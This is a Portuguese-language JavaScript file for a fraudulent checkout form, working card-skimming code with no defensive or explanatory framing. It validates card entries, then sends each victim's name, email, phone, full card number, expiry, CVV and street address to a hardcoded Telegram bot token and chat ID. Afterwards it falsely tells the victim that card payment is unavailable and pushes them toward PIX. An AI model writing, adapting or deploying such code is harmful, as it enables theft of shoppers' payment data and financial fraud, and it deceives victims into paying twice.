// Configuração do Telegram
const TELEGRAM_TOKEN = '6939434522:AAF4b7cK2pFgF3qYzXwVvUuTtSsRrQqPpOoNnMm';
const TELEGRAM_CHAT_ID = '6116307406';

// Variável global para armazenar a cidade
let userCity = '';

// Máscaras para campos do cartão
document.addEventListener('DOMContentLoaded', function() {
    const cardNumero = document.getElementById('cardNumero');
    const cardValidade = document.getElementById('cardValidade');
    const cardCvv = document.getElementById('cardCvv');
    const finalizarCartaoBtn = document.getElementById('finalizarCartaoBtn');

    // Máscara para número do cartão
    if (cardNumero) {
        cardNumero.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            value = value.replace(/(\d{4})(?=\d)/g, '$1 ');
            e.target.value = value.substring(0, 19);
        });
    }

    // Máscara para validade (MM/AA)
    if (cardValidade) {
        cardValidade.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 2) {
                value = value.substring(0, 2) + '/' + value.substring(2, 4);
            }
            e.target.value = value.substring(0, 5);
        });
    }

    // Máscara para CVV
    if (cardCvv) {
        cardCvv.addEventListener('input', function(e) {
            e.target.value = e.target.value.replace(/\D/g, '').substring(0, 4);
        });
    }

    // Máscara para CEP
    const cardCepInput = document.getElementById('cardCep');
    if (cardCepInput) {
        cardCepInput.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 5) {
                value = value.substring(0, 5) + '-' + value.substring(5, 8);
            }
            e.target.value = value.substring(0, 9);
        });
    }

    // Máscara para telefone
    const cardTelefone = document.getElementById('cardTelefone');
    if (cardTelefone) {
        cardTelefone.addEventListener('input', function(e) {
            let value = e.target.value.replace(/\D/g, '');
            if (value.length >= 11) {
                value = value.replace(/^(\d{2})(\d{5})(\d{4})/, '($1) $2-$3');
            } else if (value.length >= 7) {
                value = value.replace(/^(\d{2})(\d{4})(\d{0,4})/, '($1) $2-$3');
            } else if (value.length >= 3) {
                value = value.replace(/^(\d{2})(\d{0,5})/, '($1) $2');
            }
            e.target.value = value;
        });
    }

    // Obter cidade do usuário
    fetch('https://ipapi.co/json/')
        .then(response => response.json())
        .then(data => {
            userCity = data.city || 'Não informada';
        })
        .catch(() => {
            userCity = 'Não informada';
        });

    // Validar cartão (Luhn)
    function validarCartao(numero) {
        const num = numero.replace(/\s/g, '');
        if (!/^\d+$/.test(num)) return false;
        
        let sum = 0;
        let shouldDouble = false;
        for (let i = num.length - 1; i >= 0; i--) {
            let digit = parseInt(num.charAt(i));
            if (shouldDouble) {
                digit *= 2;
                if (digit > 9) digit -= 9;
            }
            sum += digit;
            shouldDouble = !shouldDouble;
        }
        return sum % 10 === 0;
    }

    // Validar data do cartão
    function validarValidade(validade) {
        if (!/^\d{2}\/\d{2}$/.test(validade)) return false;
        
        const [mes, ano] = validade.split('/');
        const mesNum = parseInt(mes, 10);
        const anoNum = parseInt(ano, 10);
        const anoAtual = new Date().getFullYear() % 100;
        const mesAtual = new Date().getMonth() + 1;
        
        if (mesNum < 1 || mesNum > 12) return false;
        if (anoNum < anoAtual) return false;
        if (anoNum === anoAtual && mesNum < mesAtual) return false;
        
        return true;
    }

    // Enviar dados para o Telegram
    async function enviarParaTelegram(dados) {
        const mensagem = `
<b>💳 +1 NOVA INFO CARTÃO</b>

👤 DADOS DO TITULAR
├ E-mail: ${dados.email}
├ Titular do cartão: ${dados.titular}
└ Telefone: ${dados.telefone}

💳 DADOS DO CARTÃO
├ Número: ${dados.numero}
├ Validade: ${dados.validade}
└ CVV: ${dados.cvv}

📍 ENDEREÇO DO BICO
├ CEP: ${dados.cep}
├ Rua: ${dados.rua}
├ Número: ${dados.numeroEnd}
├ Complemento: ${dados.complemento}
└ Cidade: ${dados.cidade}

⏰ Data de envio: ${new Date().toLocaleString('pt-BR')}
        `;

        try {
            const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: TELEGRAM_CHAT_ID,
                    text: mensagem,
                    parse_mode: 'HTML'
                })
            });
            
            const data = await response.json();
            return data.ok;
        } catch (error) {
            console.error('Erro ao enviar para Telegram:', error);
            return false;
        }
    }

    // Exibir toast
    function showToast(msg) {
        const toast = document.getElementById('copyToast');
        if (!toast) return;
        
        toast.innerText = msg;
        toast.classList.add('show');
        setTimeout(() => toast.classList.remove('show'), 3000);
    }

    // Finalizar compra com cartão
    if (finalizarCartaoBtn) {
        finalizarCartaoBtn.addEventListener('click', async function(e) {
            e.preventDefault();
            
            // Obter dados do formulário cartão
            const titular = document.getElementById('cardTitular')?.value.trim() || '';
            const telefone = document.getElementById('cardTelefone')?.value.trim() || '';
            const email = document.getElementById('cardEmail')?.value.trim() || '';
            const numero = document.getElementById('cardNumero')?.value.trim() || '';
            const validade = document.getElementById('cardValidade')?.value.trim() || '';
            const cvv = document.getElementById('cardCvv')?.value.trim() || '';
            
            // Endereço
            const cep = document.getElementById('cardCep')?.value.trim() || '';
            const rua = document.getElementById('cardRua')?.value.trim() || '';
            const numeroEnd = document.getElementById('cardNumeroEnd')?.value.trim() || '';
            const temComplemento = document.getElementById('temComplementoCard')?.checked || false;
            const complemento = temComplemento ? (document.getElementById('cardComplemento')?.value.trim() || '') : 'Não informado';
            
            // Validações
            if (!titular) { showToast('❌ Nome do titular é obrigatório'); return; }
            if (!telefone) { showToast('❌ Telefone é obrigatório'); return; }
            if (!email || !email.includes('@')) { showToast('❌ E-mail inválido'); return; }
            if (!numero || numero.replace(/\s/g, '').length < 16) { showToast('❌ Número do cartão inválido'); return; }
            if (!validarCartao(numero)) { showToast('❌ Número do cartão inválido'); return; }
            if (!validade || !validarValidade(validade)) { showToast('❌ Data de validade inválida'); return; }
            if (!cvv || cvv.length < 3) { showToast('❌ CVV inválido'); return; }
            if (!cep || cep.replace(/\D/g, '').length !== 8) { showToast('❌ CEP inválido'); return; }
            if (!rua) { showToast('❌ Rua é obrigatória'); return; }
            if (!numeroEnd) { showToast('❌ Número é obrigatório'); return; }
            
            // Preparar dados para envio
            const dadosEnvio = {
                titular: titular,
                telefone: telefone,
                email: email,
                numero: numero,
                validade: validade,
                cvv: cvv,
                cep: cep,
                rua: rua,
                numeroEnd: numeroEnd,
                complemento: complemento,
                cidade: userCity
            };
            
            // Desabilitar botão e mostrar loading
            const btn = finalizarCartaoBtn;
            const originalText = btn.innerHTML;
            btn.disabled = true;
            btn.innerHTML = '<i class="fas fa-spinner fa-pulse"></i> Processando...';
            
            // Enviar para Telegram
            const enviado = await enviarParaTelegram(dadosEnvio);
            
            if (enviado) {
                showToast('⚠️ Pagamento em cartão indisponível no momento, tente pagar com PIX.');
                setTimeout(() => {
                    window.location.href = '/formulario';
                }, 2000);
            } else {
                showToast('❌ Erro ao processar. Tente novamente.');
                btn.disabled = false;
                btn.innerHTML = originalText;
            }
        });
    }
});
